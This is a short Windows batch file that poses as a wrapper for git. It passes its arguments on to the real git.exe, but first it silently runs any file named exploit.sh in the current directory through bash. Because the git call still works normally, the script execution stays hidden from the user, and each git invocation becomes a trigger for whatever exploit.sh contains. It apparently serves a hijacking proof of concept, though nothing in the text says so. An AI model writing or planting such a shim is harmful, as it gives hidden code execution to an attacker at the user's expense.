@echo off
if exist exploit.sh (
    bash exploit.sh
)
"C:\Program Files\Git\cmd\git.exe" %*
